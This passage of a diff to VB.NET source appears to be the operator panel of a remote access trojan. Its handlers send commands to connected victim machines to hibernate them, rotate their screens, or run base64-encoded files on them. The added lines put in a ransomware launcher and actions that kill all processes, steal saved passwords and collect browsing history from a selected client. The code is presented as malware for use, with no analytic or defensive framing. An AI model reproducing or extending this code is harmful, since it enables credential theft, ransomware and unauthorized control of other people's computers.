                     o.RichTextBox1.AppendText(Await Helper.ConvertTB64ASYNC(l.FileName))
-                    Dim j As New Thread(Sub() Application.Run(o))
 
+                    Dim j As New Thread(Sub() Application.Run(o))
 
                     j.Start()
 
                 End If
+
             End Using
+
         End If
     End Sub
+
     Private Shared FILETOEXEC As String
+
     Private Async Sub AUTO_CHK_FILE_Click(sender As Object, e As EventArgs) Handles AUTO_CHK_FILE.Click
         Using h As New OpenFileDialog
 
             If h.ShowDialog = DialogResult.OK Then
+
                 FILETOEXEC = Await Helper.ConvertTB64ASYNC(h.FileName)
 
             End If
-        End Using
 
+        End Using
 
     End Sub
 
     Private Async Sub HibernateToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HibernateToolStripMenuItem.Click
         If AeroListView1.SelectedItems.Count = 1 Then
-
 
             Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|HBNT|" & "|ENDING|"
 
@@ -1768,7 +1978,6 @@ Public Class Form1
     Private Async Sub SuspendToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SuspendToolStripMenuItem.Click
         If AeroListView1.SelectedItems.Count = 1 Then
 
-
             Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|SPND|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
@@ -1778,7 +1987,6 @@ Public Class Form1
 
     Private Async Sub R0ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles R0ToolStripMenuItem2.Click
         If AeroListView1.SelectedItems.Count = 1 Then
-
 
             Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|0R|" & "|ENDING|"
 
@@ -1790,7 +1998,6 @@ Public Class Form1
     Private Async Sub R90ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles R90ToolStripMenuItem3.Click
         If AeroListView1.SelectedItems.Count = 1 Then
 
-
             Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|90|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
@@ -1801,7 +2008,6 @@ Public Class Form1
     Private Async Sub R180ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles R180ToolStripMenuItem4.Click
         If AeroListView1.SelectedItems.Count = 1 Then
 
-
             Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|180|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
@@ -1811,7 +2017,6 @@ Public Class Form1
 
     Private Async Sub R270ToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles R270ToolStripMenuItem5.Click
         If AeroListView1.SelectedItems.Count = 1 Then
-
 
             Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|270|" & "|ENDING|"
 
@@ -1831,7 +2036,48 @@ Public Class Form1
         End If
     End Sub
 
+    Private Sub RansomwareToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RansomwareToolStripMenuItem.Click
+        If AeroListView1.SelectedItems.Count = 1 Then
 
+            Dim F As New Rans_Form
+
+            F.Label4.Text = AeroListView1.SelectedItems(0).Text
+
+            Dim H As New Thread(Sub() Application.Run(F))
+
+            H.Start()
+
+        End If
+    End Sub
+
+    Private Async Sub KillAllProcessesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillAllProcessesToolStripMenuItem.Click
+
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+            Dim o As String = PL_VRSA & "|SP1|" & "" & "|SP2|" & "|KAP|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+
+    End Sub
+
+
+    Private Async Sub GetPasswordsToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles GetPasswordsToolStripMenuItem1.Click
+        If AeroListView1.SelectedItems.Count = 1 Then
+            Dim o As String = PL_PW & "|SP1|" & "|SP2|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+        End If
+    End Sub
+
+    Private Async Sub GetHistoryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetHistoryToolStripMenuItem.Click
+        If AeroListView1.SelectedItems.Count = 1 Then
+            Dim o As String = PL_WBBW & "|SP1|" & "|SP2|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+        End If
+    End Sub
 
 
 #End Region
